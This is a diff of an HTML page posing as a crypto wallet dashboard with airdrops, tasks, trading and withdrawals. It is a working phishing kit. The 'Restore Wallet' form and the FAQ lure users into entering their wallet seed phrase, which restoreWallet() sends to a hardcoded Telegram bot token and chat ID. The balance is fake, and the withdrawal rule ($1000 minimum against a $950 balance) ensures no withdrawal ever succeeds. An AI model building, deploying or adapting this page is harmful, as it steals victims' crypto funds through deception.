@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Crypto Dashboard</title>
   <style>
     * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif;}
@@ -19,53 +19,31 @@
     }
     .content-box h2 {color: #00ffff; margin-bottom: 15px;}
     .bottom-nav {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background: #11152a;
-      display: flex;
-      justify-content: space-around;
-      border-top: 1px solid #1f2235;
-      z-index: 100;
+      position: fixed; bottom: 0; left: 0; width: 100%;
+      background: #11152a; display: flex; justify-content: space-around;
+      border-top: 1px solid #1f2235; z-index: 100;
     }
     .nav-item {
-      flex: 1;
-      padding: 12px 5px;
-      text-align: center;
-      color: #aaa;
-      font-size: 18px;
-      cursor: pointer;
-      transition: 0.3s;
+      flex: 1; padding: 12px 5px; text-align: center;
+      color: #aaa; font-size: 18px; cursor: pointer; transition: 0.3s;
     }
     .nav-item.active {color: #00ffff; transform: translateY(-5px);}
     .nav-item span {display: block; font-size: 22px;}
     .input-field {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: none;
-      background: #0e162e;
-      color: #00ffff;
+      width: 100%; padding: 12px; margin: 10px 0;
+      border-radius: 6px; border: 1px solid #00ffff;
+      background: #0e162e; color: #00ffff;
+      outline: none; resize: none;
     }
     .btn {
       padding: 12px 20px;
       background: linear-gradient(90deg,#00c6ff,#0072ff);
-      border: none;
-      color: #fff;
-      border-radius: 8px;
-      cursor: pointer;
+      border: none; color: #fff;
+      border-radius: 8px; cursor: pointer;
       font-size: 16px;
     }
     #bnbPrice {color: #00ff90; font-weight: bold; font-size: 18px; margin-top: 10px;}
-    .tx-log {
-      margin-top: 15px;
-      font-size: 15px;
-      color: #ccc;
-      text-align: left;
-      padding-left: 10px;
-    }
+    .tx-log {margin-top: 15px; font-size: 15px; color: #ccc; text-align: left; padding-left: 10px;}
   </style>
 </head>
 <body>
@@ -79,22 +57,12 @@
       <strong class="walletAmount">$950</strong> (<span class="bnbValueHome">--</span> BNB)
     </div>
   </div>
-
-  <div class="content-box">
-    <h2>📊 BNB Price</h2>
-    <div id="bnbPrice">Loading BNB price...</div>
-  </div>
-
-  <div class="content-box">
-    <h2>📢 Latest Update</h2>
-    <p>We just launched a new feature for faster withdrawals!</p>
-  </div>
-
+  <div class="content-box"><h2>📊 BNB Price</h2><div id="bnbPrice">Loading BNB price...</div></div>
+  <div class="content-box"><h2>📢 Latest Update</h2><p>We just launched a new feature for faster withdrawals!</p></div>
   <div class="content-box" style="background: linear-gradient(135deg, #122c42, #0d1d2e); border: 1px solid #1a4f72;">
     <h2 style="color: #00e6e6;">💎 Airdrop</h2>
     <p style="color: #cceeff;">Earn free BNB daily through our airdrop rewards.</p>
   </div>
-
   <div class="content-box" style="background: linear-gradient(135deg, #2c132c, #1a0d1a); border: 1px solid #84216b;">
     <h2 style="color: #ff66cc;">🧠 Tasks</h2>
     <p style="color: #ffd6f5;">Complete daily challenges to earn bonus BNB.</p>
@@ -103,75 +71,42 @@
 
 <!-- ✅ Wallet Section -->
 <div id="wallet" class="content-section">
-  <div class="content-box">
-    <h2>💼 Wallet</h2>
+  <div class="content-box"><h2>💼 Wallet</h2>
     <p>Your current balance:</p>
     <div style="font-size: 24px; margin-top: 10px;">
       <strong class="walletAmount">$950</strong> (<span class="bnbValueWallet">--</span> BNB)
     </div>
   </div>
 
-  <!-- 🔐 Restore Wallet Box -->
   <div class="content-box" style="background: linear-gradient(135deg, #1b1f30, #0f1628); border: 1px solid #344966;">
     <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
     <p style="color: #cceeff;">Enter your token phrase to restore your wallet and start earning.</p>
-
-    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase" rows="3"></textarea>
-
+    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase..." rows="4"></textarea>
     <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
-
     <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
   </div>
 </div>
 
 <!-- ✅ FAQ Section -->
 <div id="deposit" class="content-section">
-  <div class="content-box">
-    <h2>❓ How to Earn</h2>
-    <p style="color:#cceeff; margin-top: 10px;">
-      You can start earning by completing daily tasks, joining airdrops, and submitting your token phrase in the Restore Wallet section.
-    </p>
-    <p style="color:#cceeff; margin-top: 15px;">
-      Make sure your token contains more than 12 characters and at least 3 words. After submitting, you'll receive a confirmation, and your balance will be updated when approved.
-    </p>
-  </div>
-
-  <div class="content-box">
-    <h2>📈 How to Trade</h2>
-    <p style="color:#ffd6f5; margin-top: 10px;">
-      Once you’ve earned enough, go to the Restore Wallet section and submit your trading phrase. 
-    </p>
-    <p style="color:#ffd6f5; margin-top: 15px;">
-      You must have at least <strong>$20</strong> in your wallet to begin trading. Once verified, trading will be activated and monitored by our system.
-    </p>
-  </div>
-
-  <div class="content-box">
-    <h2>💡 Need Help?</h2>
-    <p style="color:#ccc;">Still confused or need support?</p>
-    <p><a href="https://t.me/crmmrhelper" style="color:#5ffe68; text-decoration:none;">Click here to contact admin on Telegram</a></p>
-  </div>
+  <div class="content-box"><h2>❓ How to Earn</h2><p style="color:#cceeff;">Complete daily tasks, join airdrops, and restore wallet to begin earning.</p></div>
+  <div class="content-box"><h2>📈 How to Trade</h2><p style="color:#ffd6f5;">You must have at least $20 in wallet. Restore your phrase to activate trading features.</p></div>
+  <div class="content-box"><h2>💡 Need Help?</h2><p style="color:#ccc;">Still confused?</p><a href="https://t.me/crmmrhelper" style="color:#5ffe68;">Contact Admin</a></div>
 </div>
 
 <!-- ✅ Withdraw Section -->
 <div id="withdraw" class="content-section">
-  <div class="content-box">
-    <h2>➖ Withdraw</h2>
-
-    <input type="text" id="withdrawAddress" class="input-field" placeholder="Enter your BNB withdrawal address" />
-    <input type="number" id="withdrawAmount" class="input-field" placeholder="Enter BNB amount" step="0.0001" min="0" />
-
+  <div class="content-box"><h2>➖ Withdraw</h2>
+    <input type="text" id="withdrawAddress" class="input-field" placeholder="Enter BNB address" />
+    <input type="number" id="withdrawAmount" class="input-field" placeholder="Amount in BNB" step="0.0001" />
     <button class="btn" onclick="withdrawBNB()">Withdraw</button>
     <div class="tx-log" id="withdrawLog"></div>
   </div>
 </div>
 
-<!-- ✅ Transactions Section -->
+<!-- ✅ Transactions -->
 <div id="transactions" class="content-section">
-  <div class="content-box">
-    <h2>📜 Transactions</h2>
-    <div id="txHistory"></div>
-  </div>
+  <div class="content-box"><h2>📜 Transactions</h2><div id="txHistory"></div></div>
 </div>
 
 <!-- ✅ Bottom Navigation -->
@@ -183,10 +118,13 @@
   <div class="nav-item" onclick="showSection('transactions', this)"><span>📜</span>History</div>
 </div>
 
-<!-- ✅ Scripts -->
+<!-- ✅ Script -->
 <script>
   const TELEGRAM_BOT_TOKEN = "7782600997:AAHkI0CBrgQqeFdykaI7qFWMEECYImmd00M";
   const TELEGRAM_CHAT_ID = "6940101627";
+
+  let bnbPriceUSD = 600;
+  let currentBalanceUSD = 950;
 
   function showSection(id, el) {
     document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
@@ -195,61 +133,11 @@
     el.classList.add('active');
   }
 
-  let bnbPriceUSD = 600;
-  let currentBalanceUSD = 950;
-
   function updateBNBValue() {
     const bnb = (currentBalanceUSD / bnbPriceUSD).toFixed(4);
     document.querySelectorAll(".walletAmount").forEach(el => el.textContent = `$${currentBalanceUSD}`);
     document.querySelectorAll(".bnbValueHome").forEach(el => el.textContent = bnb);
     document.querySelectorAll(".bnbValueWallet").forEach(el => el.textContent = bnb);
-  }
-
-  function withdrawBNB() {
-    const address = document.getElementById("withdrawAddress").value.trim();
-    const val = parseFloat(document.getElementById("withdrawAmount").value);
-    const logEl = document.getElementById("withdrawLog");
-
-    if (!address) {
-      logEl.textContent = "❌ Please enter your BNB withdrawal address.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    if (!val || val <= 0) {
-      logEl.textContent = "❌ Please enter a valid withdrawal amount.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    if (currentBalanceUSD < 1000) {
-      logEl.textContent = "❌ Withdrawal failed: Minimum balance of $1000 required.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    const usd = val * bnbPriceUSD;
-
-    if (usd > currentBalanceUSD) {
-      logEl.textContent = "❌ Withdrawal failed: Not enough balance.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    currentBalanceUSD -= usd;
-    logEl.textContent = `✅ Withdrew ${val} BNB ($${usd.toFixed(2)}) to address: ${address}`;
-    logEl.style.color = "#00ff90";
-    addToHistory(logEl.textContent);
-    updateBNBValue();
-
-    document.getElementById("withdrawAmount").value = "";
-    document.getElementById("withdrawAddress").value = "";
-  }
-
-  function addToHistory(txt) {
-    const div = document.createElement("div");
-    div.textContent = txt;
-    document.getElementById("txHistory").prepend(div);
   }
 
   function restoreWallet() {
@@ -265,11 +153,11 @@
 
     if (currentBalanceUSD < 20) {
       msgBox.style.color = 'red';
-      msgBox.innerHTML = `❌ You need at least <strong>$20</strong> in your wallet before restoring.<br>Current balance: <strong>$${currentBalanceUSD}</strong>`;
+      msgBox.innerHTML = `❌ You need at least <strong>$20</strong> before restoring.<br>Current balance: $${currentBalanceUSD}`;
       return;
     }
 
-    const message = `🔐 Wallet Restore Request:\n\n${input}`;
+    const message = `🔐 Restore Wallet Request:\n\n${input}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { "Content-Type": "application/json" },
@@ -280,16 +168,53 @@
     }).then(res => {
       if (res.ok) {
         msgBox.style.color = '#00ff90';
-        msgBox.innerHTML = `✅ Wallet restored successfully.<br><br>🟢 <strong>Trading and Earning</strong> will be enabled if you have at least $20 in your wallet.`;
+        msgBox.innerHTML = `✅ Wallet restored successfully.<br>🟢 Trading and Earning will be activated only of you have $20 in your BNB Wallet in the phrases you submitted.`;
         document.getElementById("tokenPhrase").value = '';
       } else {
         msgBox.style.color = 'red';
-        msgBox.textContent = '❌ Failed to send restore request.';
+        msgBox.textContent = '❌ Failed to send request.';
       }
     }).catch(() => {
       msgBox.style.color = 'red';
-      msgBox.textContent = '⚠️ Network error. Please try again.';
+      msgBox.textContent = '⚠️ Network error. Try again.';
     });
+  }
+
+  function withdrawBNB() {
+    const address = document.getElementById("withdrawAddress").value.trim();
+    const val = parseFloat(document.getElementById("withdrawAmount").value);
+    const logEl = document.getElementById("withdrawLog");
+
+    if (!address || !val || val <= 0) {
+      logEl.textContent = "❌ Enter valid address and amount.";
+      logEl.style.color = "red";
+      return;
+    }
+
+    if (currentBalanceUSD < 1000) {
+      logEl.textContent = "❌ Need $1000 minimum to withdraw.";
+      logEl.style.color = "red";
+      return;
+    }
+
+    const usd = val * bnbPriceUSD;
+    if (usd > currentBalanceUSD) {
+      logEl.textContent = "❌ Not enough balance.";
+      logEl.style.color = "red";
+      return;
+    }
+
+    currentBalanceUSD -= usd;
+    updateBNBValue();
+    logEl.textContent = `✅ Sent ${val} BNB ($${usd.toFixed(2)}) to ${address}`;
+    logEl.style.color = "#00ff90";
+    addToHistory(logEl.textContent);
+  }
+
+  function addToHistory(txt) {
+    const div = document.createElement("div");
+    div.textContent = txt;
+    document.getElementById("txHistory").prepend(div);
   }
 
   fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")
